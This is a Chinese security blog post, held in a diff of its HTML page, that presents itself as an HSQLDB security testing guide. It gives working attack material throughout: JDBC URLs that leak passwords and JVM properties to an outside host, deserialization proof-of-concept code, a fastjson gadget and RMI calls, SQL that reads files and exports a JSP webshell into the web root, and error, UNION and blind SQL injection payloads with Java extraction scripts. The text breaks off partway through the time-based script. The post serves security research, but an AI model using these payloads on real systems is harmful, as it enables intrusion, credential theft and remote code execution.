@@ -1,0 +1,445 @@
+<!DOCTYPE HTML>
+<html  lang="zh-CN">
+<head>
+    <meta http-equiv="Content-Type" charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>HSQLDB 安全测试指南 - 浅蓝 's blog</title>
+	
+    <!-- 使用url函数转换相关路径 -->
+	<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js" data-no-instant></script>
+	<script src="/usr/themes/Bigfa/static/js/lately.min.js" data-no-instant></script>
+    <link rel="stylesheet" href="/usr/themes/Bigfa/static/css/style.css">
+	
+
+    <!-- 通过自有函数输出HTML头部信息 -->
+    <meta name="description" content="1. 背景HSQLDB(HyperSQL DataBase) 是一个完全由Java编写的小型嵌入式数据库，因为它可以以文件或者内存的形式运行，不需要单独另起服务器，HSQLDB 也是一个服务器+..." />
+<meta name="generator" content="Typecho 1.1/17.10.30" />
+<meta name="template" content="Bigfa" />
+<link rel="alternate" type="application/rss+xml" title="HSQLDB 安全测试指南 &raquo; 浅蓝 's blog &raquo; RSS 2.0" href="https://b1ue.cn/feed/archives/458.html" />
+<link rel="alternate" type="application/rdf+xml" title="HSQLDB 安全测试指南 &raquo; 浅蓝 's blog &raquo; RSS 1.0" href="https://b1ue.cn/feed/rss/archives/458.html" />
+<link rel="alternate" type="application/atom+xml" title="HSQLDB 安全测试指南 &raquo; 浅蓝 's blog &raquo; ATOM 1.0" href="https://b1ue.cn/feed/atom/archives/458.html" />
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-420'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-420'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
+        load: 'onload'
+    }, added = false;
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-420'),
+            input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = '_';
+        input.value = (function () {
+    var _7KSeSD = //'y'
+'9'+'b'//'b'
++//'7uD'
+'6af'+//'QR'
+'7f7'+//'e'
+'e'+/* 'jNe'//'jNe' */''+//'MCe'
+'1'+//'L'
+'75'+/* '9N2'//'9N2' */''+//'v'
+'d2'+'7'//'MF'
++'71a'//'n'
++/* 'qW'//'qW' */''+'5'//'Eb'
++//'gn0'
+'67'+'a5'//'12'
++/* '0'//'0' */''+'03'//'Q58'
++/* 'hIk'//'hIk' */''+''///*'Nj7'*/'Nj7'
++'41'//'AC'
++'59'//'LE'
++/* 'i'//'i' */''+/* 'p0e'//'p0e' */''+'893'//'nNE'
++//'xl'
+'6'+'a'//'cC'
+, _YAw = [[1,2],[7,8]];
+    
+    for (var i = 0; i < _YAw.length; i ++) {
+        _7KSeSD = _7KSeSD.substring(0, _YAw[i][0]) + _7KSeSD.substring(_YAw[i][1]);
+    }
+
+    return _7KSeSD;
+})();
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                function append() {
+                    if (!added) {
+                        forms[0].appendChild(input);
+                        added = true;
+                    }
+                }
+            
+                for (var i = 0; i < event.triggers.length; i ++) {
+                    var trigger = event.triggers[i];
+                    document[event.add](trigger, append);
+                    window[event.add](trigger, append);
+                }
+            }
+        }
+    });
+})();
+</script><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/styles/customemin.css" /><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/lines.css" /></head>
+
+<body class="is-enableBrandingButtons is-js">
+  <div class="site-main surface-container"> 
+    <div class="butterBar"><p class="butterBar-message"></p></div> 
+   
+   <header class="metabar metabar--bordered metabar--top u-clearfix"> 
+    <div class="metabar-block u-floatLeft" itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization"> 
+     <h1 class="site-title u-floatLeft" itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject"> <a href="https://b1ue.cn/" class="logo" title="浅蓝 's blog"> <img src="/logo.png" width="38" /></a></h1>  
+    </div> 
+    <div class="metabar-block metabar-center"> 
+		 <nav class="navTabs navTabs--metabar navTabs--narrow" itemtype="http://schema.org/SiteNavigationElement" itemscope=""> 
+			 <div class="layoutSingleColumn layoutSingleColumn--wide">
+				  <ul class="subnav-ul">
+										<li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/category.html">分类</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/archives.html">归档</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/links.html">友情链接</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/about.html">关于我</a></li>									  </ul>
+			 </div>
+		</nav> 
+    </div> 
+    <div class="metabar-block u-floatRight"> 
+     <form id="search" class="metabar-predictiveSearch search-form" action="https://b1ue.cn/" role="search" method="GET"> 
+        <label title="Search 浅蓝 's blog"> 
+        <svg xmlns="http://www.w3.org/2000/svg" style="display:none;">
+          <symbol viewBox="0 0 25 25" id="svg-search">
+            <title>svg-search</title>
+            <path d="M20.067 18.933l-4.157-4.157c.837-1.032 1.34-2.345 1.34-3.776 0-3.314-2.686-6-6-6s-6 2.686-6 6 2.686 6 6 6c1.43 0 2.744-.503 3.776-1.34l4.157 4.157c.113.113.27.183.442.183.345 0 .625-.28.625-.625 0-.173-.07-.33-.183-.442zM6.5 11c0-2.62 2.13-4.75 4.75-4.75S16 8.38 16 11s-2.13 4.75-4.75 4.75S6.5 13.62 6.5 11z"
+            />
+          </symbol>
+        </svg>
+        <svg viewBox="0 0 25 25" width="25" height="25" class="svgIcon">
+            <use class="svgIcon-use" xlink:href="#svg-search">
+            </use>
+        </svg>
+         <input id="input" class="textInput textInput--dark textInput--rounded" name="s" type="text" required="true" placeholder="Search 浅蓝 's blog" /> 
+  	   </label>
+     </form> 
+    </div> 
+   </header>
+
+
+    
+    
+
+<div class="layoutSingleColumn">
+    <article class="u-paddingTop50" itemscope="itemscope" itemtype="http://schema.org/Article">
+      <header class="entry-header">
+        <h2 class="entry-title" itemprop="headline">HSQLDB 安全测试指南</h2>
+        <div class="entry-meta">
+            <a><time class="lately-a" datetime="2020-12-29 14:17:00" itemprop="datePublished">2020-12-29 14:17:00</time></a>
+            <span class="middotDivider"></span>
+            <a href="https://b1ue.cn/archives/458.html"><a href="https://b1ue.cn/category/vul/">漏洞</a>,<a href="https://b1ue.cn/category/safe/">安全</a></a>
+        </div>
+      </header>
+
+      <meta itemscope itemprop="mainEntityOfPage"  itemType="https://schema.org/WebPage" itemid="https://b1ue.cn/archives/458.html"/>
+
+        <div class="grap" itemprop="articleBody">
+            <h1>1. 背景</h1><p>HSQLDB(HyperSQL DataBase) 是一个完全由Java编写的小型嵌入式数据库，因为它可以以文件或者内存的形式运行，不需要单独另起服务器，HSQLDB 也是一个服务器+客户端一体的 jar 包，HSQLDB 内置了 HTTP 和 HSQL 两种协议的服务器，通过命令行就可以启动 HSQLDB 服务器，除此之外 HSQLDB 还带了一个 Servlet 类<code>org.hsqldb.server.Servlet</code>可以注册到 Tomcat 中使用。</p><p><img src="/usr/uploads/2020/12/3684077444.png" alt="image-20201229162900602.png" title="image-20201229162900602.png"></p><p>在我开发的工具”溯光“中就使用它来存储数据，我在之前做过的几个代码审计项目中也找过与其相关的一些漏洞。所以下文我会分享一些 HSQLDB 相关的一些测试方法。</p><p>HSQLDB 有四种连接模式。</p><ol><li>内存模式：直接将数据存储在JVM的内存，数据会随着JVM的结束而消失。</li><li>文件模式：会将数据以文件形式存储在指定的某个目录下。</li><li>WEB服务器模式：连接hsqldb的http端口</li><li>HSQL服务器模式：连接hsqldb的hsql端口</li></ol><p>对应的 jdbc url 分别如下</p><ol><li>jdbc:hsqldb:mem:myDbName</li><li>jdbc:hsqldb:file:/opt/db/myDbName</li><li>jdbc:hsqldb:<a href="http://localhost/myDbName" target="_blank">http://localhost/myDbName</a></li><li>jdbc:hsqldb:hsql://localhost:9001/myDbName</li></ol><p>还有一个是 res 模式，但这个不常用，就不提了。</p><h1>2. 关于调试</h1><blockquote><p>可以看到自己编译的类中，每个method中都有一个 LineNumberTable，这个信息就是用于调试的信息，但是hsqldb中没有这个信息，所以是无法调试下断点的，hsqldb应该在编译时添加了某些参数或者使用了其他手段来去除这些信息。 ——引用自《F5 BIG-IP hsqldb(CVE-2020-5902)漏洞踩坑分析》</p></blockquote><p>所以要想调试可以通过 <strong>Longofo</strong> 给出的  <a href="https://github.com/longofo/hsqldb-source" target="_blank">longofo/hsqldb-source</a> 编译后再进行调试，不过作者给出的是 1.8 版本的 hsqldb，如需调试高版本需要自行编译相应版本的 hsqldb ，本文演示所用到的版本为 2.5.1。</p><h1>3. JDBC URL</h1><p>JDBC URL我认为可以单独拎出来讲一下，因为有一些场景可能允许自行构造 JDBC URL 来连接数据库，例如一些开发者平台可以填写数据源，其中包括JDBC URL，还有 fastjson 反序列化的一些 DataSource 类型的 gadget 也可以填写 JDBC URL。</p><p>我也在一些代码审计项目中发现了 hsqldb  JDBC URL 导致的安全问题。</p><p>先模拟下第一个场景，描述如下</p><p><strong>有一个数据源修改功能，可以修改jdbc url、jdbc driver class、数据库账号、数据库密码等信息，其中数据库密码在页面上是打码的，无法从页面和抓包直接查看。</strong></p><p><img src="/usr/uploads/2020/12/1115623966.png" alt="image-20201227175444736.png" title="image-20201227175444736.png"></p><p>我的思路如下</p><h3>3.1 SSRF+破解明文密码</h3><p>由于 hsqldb 允许使用 http/https 的方式去连接服务器，所以可以进行无回显的 SSRF 探测，同时验证密码时也会把明文密码带入请求体，也就可以获得到页面中看不到的密码了。</p><p><img src="/usr/uploads/2020/12/3544382064.png" alt="image-20201227180443624.png" title="image-20201227180443624.png"></p><h3>3.2 获取JVM敏感变量</h3><p>导致问题的代码在<code>org.hsqldb.DatabaseURL#parseURL</code>方法</p><p><img src="/usr/uploads/2020/12/1351429731.png" alt="image-20201227180814516.png" title="image-20201227180814516.png"></p><p>这里取出 <code>${}</code>里的字符串作为参数从<code>System.getProperty</code>方法调取对应的<code>value</code></p><p><img src="/usr/uploads/2020/12/557825851.png" alt="image-20201227181332838.png" title="image-20201227181332838.png"></p><p>也就是说 System.getProperties() 所有的信息都可以通过 http 的方式携带出去。</p><p>比如要截取<code>user.dir</code></p><p><img src="/usr/uploads/2020/12/1548850295.png" alt="image-20201227181625903.png" title="image-20201227181625903.png"></p><h3>3.3 写SQL文件</h3><p>前面两种如果不能出外网可能就无法利用，所以要想获取密码就得把SCRIPT文件写到 web 目录下。</p><p>前面提到 hsqldb 是支持文件模式的。</p><p>所以需要改一下 jdbc url</p><p><code>jdbc:hsqldb:file:E:/source/java/hsqltest/target/hsqltest/test1</code></p><p><img src="/usr/uploads/2020/12/2075556521.png" alt="image-20201227183950459.png" title="image-20201227183950459.png"></p><p>连接后会在<code>E:/source/java/hsqltest/target/hsqltest/</code>目录下生成这几个文件，其中 SCRIPT 文件是数据库初始化的 SQL 脚本文件，包含了用户名与MD5加密后的密码，虽然MD5不能直接破解，但大部分常见的密码都已经被撞出来了。</p><p><img src="/usr/uploads/2020/12/149234660.png" alt="image-20201227184237268.png" title="image-20201227184237268.png"></p><p>因为文件被写到了 web 目录，所以可以直接访问 test1.script 文件就能得到密码 MD5。</p><p><img src="/usr/uploads/2020/12/1867907581.png" alt="image-20201227184325408.png" title="image-20201227184325408.png"></p><p>再通过 SOMD5/CMD5 等平台即可查出明文</p><h1>4. 反序列化</h1><h3>4.1 参数恢复</h3><p>前段时间 F5 BIG IP 爆出过一个漏洞，其中就用到了 hsqldb 的反序列化漏洞。</p><p>因为它的 hsqldb 版本是较低的 1.8 版本，在 Servlet 收到 CALL 命令 恢复参数对象时造成了反序列化。</p><p>关于 1.8 的这个反序列化我就不再复现了。相关资料可参考<a href="https://paper.seebug.org/1271/" target="_blank">《F5 BIG-IP hsqldb(CVE-2020-5902)漏洞踩坑分析》</a></p><pre><code>public static void testLocal() throws IOException, ClassNotFoundException, SQLException {
+        String url = &quot;http://localhost:8080&quot;;
+        String payload = Hex.encodeHexString(Files.readAllBytes(Paths.get(&quot;calc.ser&quot;)));
+
+        System.out.println(payload);
+
+        String dburl = &quot;jdbc:hsqldb:&quot; + url + &quot;/hsqldb_war_exploded/hsqldb/&quot;;
+        Class.forName(&quot;org.hsqldb.jdbcDriver&quot;);
+
+        Connection connection = DriverManager.getConnection(dburl, &quot;sa&quot;, &quot;&quot;);
+        Statement statement = connection.createStatement();
+        statement.execute(&quot;call \&quot;java.lang.System.setProperty\&quot;('org.apache.commons.collections.enableUnsafeSerialization','true')&quot;);
+        statement.execute(&quot;call \&quot;org.hsqldb.util.ScriptTool.main\&quot;('&quot; + payload + &quot;');&quot;);
+    }</code></pre><p>参照 POC 实质上就是 CALL 命令在调用 java 静态方法时遇到 HEX 参数会自动解码并将解码后的 bytes 直接通过 ObjectInputStream 反序列化回 Java 对象。</p><p>2.5.1 也同样存在参数恢复的反序列化漏洞，一开始我以为被修了，但经过研究发现还是可以通过调用方法的时候反序列化参数。</p><p><img src="/usr/uploads/2020/12/2818115355.png" alt="image-20201228161818350.png" title="image-20201228161818350.png"></p><p><img src="/usr/uploads/2020/12/2742050797.png" alt="image-20201228161703550.png" title="image-20201228161703550.png"></p><p><img src="/usr/uploads/2020/12/1491549287.png" alt="image-20201228161321239.png" title="image-20201228161321239.png"></p><h3>4.2 图形化客户端</h3><p>上面这种是由客户端请求服务端的。</p><p>由 HSQLDB 图形化客户端请求恶意服务端造成的反序列化漏洞，但有点鸡肋，不像 Mysql driver 反序列化那样连接成功后自动进行反序列化，需要用到图形化客户端来连接才可以。</p><p><img src="/usr/uploads/2020/12/3498968799.png" alt="image-20201228162519512.png" title="image-20201228162519512.png"></p><p>可以看到 org.hsqldb.types.JavaObjectData#getObject 方法有被 </p><p><code>org.hsqldb.jdbc.JDBCResultSet#getObject(int)</code>和<code>org.hsqldb.jdbc.JDBCCallableStatement#getObject(int)</code>用到。</p><p>这两个类也就是 jdbc 客户端的ResultSet和Statement类。</p><p>只要他们的 getObject 方法被调用到且该字段的值可控就可以造成反序列化。</p><p>我通过查阅官方文档和阅读代码得可以创建一个带有 OTHER 类型字段的表。</p><p><img src="/usr/uploads/2020/12/397677717.png" alt="image-20201228163959887.png" title="image-20201228163959887.png"></p><p>通过 INSERT 语句插入一条序列化对象，当图形化客户端查询到这条结果或者 Java 客户调用到 ResultSet / Statement 的 getObject 方法时便会触发反序列化。</p><p>首先应先创建一个表， 设置 obj 字段为 OTHER 类型。</p><pre><code>CREATE TABLE movies (director VARCHAR(30), obj OTHER)</code></pre><p>然后通过如下代码插入一条反序列化 payload 到这个表。</p><pre><code>        String dburl = &quot;jdbc:hsqldb:http://127.0.0.1/&quot;;
+        Class.forName(&quot;org.hsqldb.jdbc.JDBCDriver&quot;);
+        Connection connection = DriverManager.getConnection(dburl, &quot;sa&quot;, &quot;&quot;);
+        connection.prepareStatement(&quot;CREATE TABLE movies (director VARCHAR(30), obj OTHER)&quot;).executeUpdate();
+        PreparedStatement preparedStatement = connection.prepareStatement(&quot;insert INTO MOVIES values(?,?)&quot;);
+
+        Object calc = new JRMPClient().getObject(&quot;127.0.0.1:2333&quot;);
+        String s = &quot;a&quot; + System.currentTimeMillis();
+        preparedStatement.setString(1,&quot;a&quot;+System.currentTimeMillis());
+        preparedStatement.setObject(2,calc);
+        System.out.println(preparedStatement.executeUpdate());</code></pre><p><img src="/usr/uploads/2020/12/1424903877.png" alt="image-20201228164330307.png" title="image-20201228164330307.png"></p><p>当我再用 HSQLDB 图形化客户端去连接这个数据库并且查询 movies 表时就会自动触发反序列化。</p><p><img src="/usr/uploads/2020/12/2444679271.png" alt="image-20201228163525637.png" title="image-20201228163525637.png"></p><h3>4.3 DataSource gadget</h3><p>在 fastjson 开启了 autotype 且没有可用的 rce gadget 的场景下可以用到。</p><pre><code>{&quot;@type&quot;:&quot;org.hsqldb.jdbc.pool.JDBCPooledDataSource&quot;,&quot;url&quot;:&quot;jdbc:hsqldb:http://127.0.0.1:2333/?${user.dir}&quot;,&quot;user&quot;:&quot;sa&quot;,&quot;password&quot;:&quot;&quot;,&quot;a&quot;:{&quot;$ref&quot;:&quot;$.pooledConnection&quot;}}</code></pre><p><img src="/usr/uploads/2020/12/1635815249.jpg" alt="1609322454(1).jpg" title="1609322454(1).jpg"></p><p>实际上就是用 hsqldb 的 <code>org.hsqldb.jdbc.pool.JDBCPooledDataSource</code> 来连接指定 jdbc url 的 hsqldb 数据库。</p><h1>5. 高危SQL命令</h1><h3>5.1 方法调用</h3><p>根据我的测试结果来看有三种方式可以来调用 JAVA 方法。</p><p><strong>第一种：自定义函数</strong></p><pre><code>create function rce(VARCHAR(80))
+    returns VARCHAR(80)
+    no sql
+    language java
+    external name 'CLASSPATH:java.rmi.Naming.list'
+;
+CALL rce('rmi://127.0.0.1:2333/a')</code></pre><p>和其他数据库一样，hsqldb 也可以创建自定义函数，且允许引用 Java 的静态方法，要求参数和返回值都是 HSQLDB 支持的类型。</p><p>我找到了 <code>java.rmi.Naming.list</code>正好符合，且可以造成反序列化。</p><p>除此之外还有<code>javax.naming.InitialContext.doLookup</code></p><p><strong>第二种：直接调用Java方法</strong></p><pre><code>CALL &quot;java.rmi.Naming.list&quot;('rmi://127.0.0.1:2333/a')</code></pre><p><img src="/usr/uploads/2020/12/1595472336.png" alt="image-20201228170337716.png" title="image-20201228170337716.png"></p><p>这种原理和第一种一样，同样需要参数和返回类型是 HSQLDB 支持的类型</p><p><strong>第三种：设置密码检查扩展方法</strong></p><pre><code>SET DATABASE PASSWORD CHECK FUNCTION EXTERNAL NAME 'CLASSPATH:java.class.method'
+//创建用户密码和修改当前用户密码时会触发
+SET DATABASE AUTHENTICATION FUNCTION EXTERNAL NAME 'CLASSPATH:java.class.method'
+//认证时会触发</code></pre><h3>5.2 文件读取</h3><p><strong>LOAD_FILE</strong></p><p>我查阅了<a href="http://www.hsqldb.org/doc/2.0/guide/builtinfunctions-chapt.html" target="_blank">官方文档</a>，找到了 <code>LOAD_FILE</code>函数。主要是用来读取文件和请求URL的。</p><p>但这个函数有个缺点，如果参数中没有把 <code>hsqldb.allow_full_path</code>设置为 <code>true</code> 就只能读取 hsqldb 数据库文件存放的目录及其子目录，也无法通过<code>..</code>跳转目录。</p><p><img src="/usr/uploads/2020/12/2031245268.png" alt="image-20201228152320444.png" title="image-20201228152320444.png"></p><p><img src="/usr/uploads/2020/12/3942413302.png" alt="image-20201228152045342.png" title="image-20201228152045342.png"></p><p>参考上图，要求 <code>allowFull</code> 和 <code>propTextAllowFullPath</code>有一个为 <code>True</code>才可以跨目录。</p><p><strong>TEXT TABLE</strong></p><p>这个需要创建一个 TEXT 类型的 TABLE ，然后通过 SET 命令向该表插入数据库。</p><pre><code>CREATE TEXT TABLE TESTDATA(
+  txt VARCHAR(255)
+ ) ;</code></pre><p>然后再通过 SET 命令向 TEXT TABLE 导入文件</p><pre><code>SET TABLE TESTDATA SOURCE 'data.script'</code></pre><p><img src="/usr/uploads/2020/12/1216539652.png" alt="image-20201228172619522.png" title="image-20201228172619522.png"></p><p>但同样和 LOAD_FILE 一样不能跨目录读取文件。</p><p><strong>IMPORT SCRIPT</strong></p><p>这个和其他两个不同，他的功能是读取文件并且导入脚本。</p><p>与前两个不同的是他可以跨目录读取文件，但缺点就是读出来的文件是以报错形式显示的，而且只能读一部分内容。</p><pre><code>PERFORM IMPORT SCRIPT VERSIONING DATA FROM 'C:/windows/win.ini'</code></pre><p><img src="/usr/uploads/2020/12/3920882517.png" alt="image-20201228174010127.png" title="image-20201228174010127.png"></p><p>他能跨目录读文件的原因是 allowFull 参数被设定为 <code>true</code>了</p><h3>5.3 文件写入</h3><p><strong>SCRIPT </strong></p><p>SCRIPT 这个命令会把当前的数据库脚本导出到指定的文件路径下，不受 allowFull 参数的限制，也没有文件后缀限制。</p><pre><code>http://localhost:8888/query?keyword=test';CREATE+TABLE+EVIL(txt+VARCHAR(255));--</code></pre><pre><code>http://localhost:8888/query?keyword=test';insert+into+EVIL+values('&lt;%25=666666-1%25&gt;');--</code></pre><pre><code>http://localhost:8888/query?keyword=test';SCRIPT+'E:/source/java/hsqltest/target/hsqltest/evil.jsp';--</code></pre><p>我分别执行了三条SQL 命令。</p><p>第一条和第二条用于写入 JSP 代码到 script 文本中。</p><p>第三条用 SCRIPT 命令把脚本文本导出为 jsp 文件到web目录下。</p><p>最后再去访问 <code>http://localhost:8888/evil.jsp</code> 就可以执行 jsp 代码。</p><p><img src="/usr/uploads/2020/12/3701996054.png" alt="image-20201228180821171.png" title="image-20201228180821171.png"></p><h1>6. SQL注入</h1><p>hsqldb 和其他数据库基本一样，也有报错注入、UNION注入、盲注。</p><p>另外 hsqldb 默认支持堆叠查询。</p><p><img src="/usr/uploads/2020/12/2612457155.png" alt="image-20201228184915569.png" title="image-20201228184915569.png"></p><p>因为 RESTRICT （防止多行查询）的选项是关闭的。所以<code>Statement.executeQuery()</code>可以多行查询，所以上文中提到的一些测试方式大多数都可以用。</p><h3>6.1 报错注入</h3><p>主流的报错注入方式主要分为两类。</p><p>一类是 mysql、Oracle 这种使用自带函数使错误抛出的信息中携带参数值。另一类是 sqlserver 这种转型报错。</p><p>因为转型在这里并不适用，所以开始看一些函数的源码。</p><p>其中我关注到了 <code>LOAD_FILE</code>函数，发现它会把参数当做文件去读取，一旦遇到文件无法读取的情况就会把文件路径带入到报错信息中输出。</p><p><img src="/usr/uploads/2020/12/1026257734.png" alt="image-20201228231446148.png" title="image-20201228231446148.png"></p><p><img src="/usr/uploads/2020/12/1446310531.png" alt="image-20201228231828056.png" title="image-20201228231828056.png"></p><p>从源码中来看就是文件没读到，抛出了一个异常，在message中把这个路径给带了出来。</p><p><img src="/usr/uploads/2020/12/712948236.png" alt="image-20201228232200662.png" title="image-20201228232200662.png"></p><p>想找其他可以报错注入的函数也很简单，搜索<code>Error.error\(.*, .*\)</code>这条正则一步步顺着向上找对应的函数。</p><p>例如<code>REGEXP_REPLACE</code>这个函数</p><p><img src="/usr/uploads/2020/12/2343328423.png" alt="image-20201228233546832.png" title="image-20201228233546832.png"></p><p>这里它把第六个参数带入了<code>FunctionCustom.regexpParams()</code>方法</p><p><img src="/usr/uploads/2020/12/101782607.png" alt="image-20201228233522354.png" title="image-20201228233522354.png"></p><p>当switch的所有case都不满足时会把它带入异常信息抛出，也就造成了报错注入。</p><p>下面展示下两个报错注入的例子</p><pre><code>http://localhost:8888/query?keyword=test' and REGEXP_REPLACE('','','','',1,concat('~',user()))='1</code></pre><p><img src="/usr/uploads/2020/12/1384718353.png" alt="image-20201228234055341.png" title="image-20201228234055341.png"></p><pre><code>http://localhost:8888/query?keyword=test' and load_file(concat('x:/',(SELECT top 1 concat(user_name,'~',password_digest) FROM information_schema.system_users)))!=null and '1'='1</code></pre><p><img src="/usr/uploads/2020/12/1770792448.png" alt="image-20201228234957552.png" title="image-20201228234957552.png"></p><h3>6.2 UNION 注入</h3><p>和其他类型的数据库一样，基本没什么差别</p><p><img src="/usr/uploads/2020/12/195530710.png" alt="image-20201228235344785.png" title="image-20201228235344785.png"></p><p><img src="/usr/uploads/2020/12/698012320.png" alt="image-20201228235404997.png" title="image-20201228235404997.png"></p><p>先通过 order by 查当前表的 column 数量</p><pre><code>http://localhost:8888/query?keyword=test' or 1=1 order by 13--!</code></pre><p>13 返回正常，14报错，说明 column 有 13 个。</p><pre><code>http://localhost:8888/query?keyword=test' and 1=2 union select database(),(SELECT top 1 concat(user_name,'~',password_digest) FROM information_schema.system_users),null,null,null,null,null,null,null,null,null,true,null from INFORMATION_SCHEMA.TABLES--!</code></pre><p>注入出数据库账号密码</p><p><img src="/usr/uploads/2020/12/940961860.png" alt="image-20201229002324582.png" title="image-20201229002324582.png"></p><h3>6.3 布尔盲注</h3><p>布尔盲注主要通过页面返回的正常与否判断SQL执行的情况。</p><p>其他数据库的盲注用到的函数 hsqldb 基本都有。</p><p>如:<strong>SUBSTR</strong>、<strong>length</strong>、<strong>HEX</strong>、<strong>DECODE</strong>等。</p><p>其中<strong>DECODE</strong>就相当于 mysql 的<strong>IF</strong>。</p><pre><code>decode(user(),'SA',1,0)</code></pre><p>这条SQL的含义是“如果user()的值等于'SA'则返回1，否则返回0”</p><p>再带入到盲注脚本就很好理解了。</p><pre><code>import net.dongliu.requests.Requests;
+import org.apache.commons.lang.StringUtils;
+import org.springframework.security.crypto.codec.Hex;
+
+import java.util.HashMap;
+
+/**
+ * @author 浅蓝
+ * @email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="63010f1606230a1b1006004d0c1104">[email&#160;protected]</a>
+ * @since 2020/12/29 12:13
+ */
+public class hsqldbinject {
+
+    public static void main(String[] args) {
+
+        String sql = &quot;user()&quot;;
+        sql = &quot;hex(&quot;+sql+&quot;)&quot;;
+        String flag = &quot;TABLE_SCHEM&quot;;
+        String url = &quot;http://localhost:8888/query&quot;;
+        String getLength = &quot;length(&quot;+sql+&quot;)&quot;;
+        StringBuffer result = new StringBuffer();
+        int length = 0;
+        for (int i = 1; i &lt; 99; i++) {
+            HashMap param = new HashMap&lt;&gt;();
+            param.put(&quot;keyword&quot;,String.format(&quot;test'%s --!&quot;, &quot;and &quot; + i + &quot;=&quot; + getLength));
+            String body = Requests.get(url).params(param).send().readToText();
+            if (StringUtils.contains(body,flag)){
+                length = i;
+                break;
+            }else{
+                continue;
+            }
+        }
+        System.out.println(sql + &quot; length = &quot;+length);
+        for (int i = 1; i &lt;= length ; i++) {
+            for (int j = 0; j &lt;= 9; j++) {
+                HashMap param = new HashMap&lt;&gt;();
+                param.put(&quot;keyword&quot;, &quot;test' and decode(substr(&quot;+sql+&quot;,&quot;+i+&quot;,1),'&quot;+j+&quot;',1,0)=1 --!&quot;);
+                String body = Requests.get(url).params(param).send().readToText();
+                System.out.println(param);
+                if (StringUtils.contains(body,flag)){
+                    result.append(j);
+                    break;
+                }else{
+                    continue;
+                }
+            }
+        }
+        System.out.println(&quot;HEX result = &quot;+result);
+        System.out.println(&quot;UNHEX result = &quot;+ new String(Hex.decode(result)));
+
+    }
+}
+</code></pre><p><img src="/usr/uploads/2020/12/267100950.png" alt="image-20201229124600592.png" title="image-20201229124600592.png"></p><p>运行盲注脚本就可以查到SQL结果</p><h3>6.4 延时盲注</h3><p>与其他数据库不同的是我没有发现 hsqldb 有延时函数。</p><p>所以需要通过其他的方法来达到延时的效果。我有两种思路。</p><ol><li>通过 <strong>REGEXP_MATCHES</strong> 函数引发REDOS造成延时（慎用）</li><li>查一个数据非常多的表引发延时。</li></ol><p>需要注意的是<strong>REGEXP_MATCHES</strong> 会造成CPU过载，使用不当可能会卡死。</p><p><img src="/usr/uploads/2020/12/805486292.png" alt="image-20201229125649358.png" title="image-20201229125649358.png"></p><pre><code>REGEXP_MATCHES('aaaaaaaaaaaaaaaaaaaaaaaaaaaX','(a+)+')</code></pre><p>这条SQL我运行时会延时 4 秒左右，<strong>X</strong>前面的<strong>a</strong>越多延迟时间就越长，一般能延迟5秒左右就可以了。</p><pre><code>import net.dongliu.requests.Requests;
+import org.apache.commons.lang.StringUtils;
+import org.springframework.security.crypto.codec.Hex;
+
+import java.util.HashMap;
+
+/**
+ * @author 浅蓝
+ * @email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e6848a9383a68f9e958385c8899481">[email&#160;protected]</a>
+ * @since 2020/12/29 12:13
+ */
+public class hsqldbinject {
+
+    public static void main(String[] args) {
+
+        String sql = &quot;user()&quot;;
+        sql = &quot;hex(&quot;+sql+&quot;)&quot;;
+        long flag_timeout = 3000;
+        String url = &quot;http://localhost:8888/query&quot;;
+        String getLength = &quot;length(&quot;+sql+&quot;)&quot;;
+        String sleep = &quot;REGEXP_MATCHES('aaaaaaaaaaaaaaaaaaaaX',concat('(a',CHAR(43),')',CHAR(43)))&quot;;
+        StringBuffer result = new StringBuffer();
+        int length = 0;
+        for (int i = 1; i &lt; 99; i++) {
+            HashMap param = new HashMap&lt;&gt;();
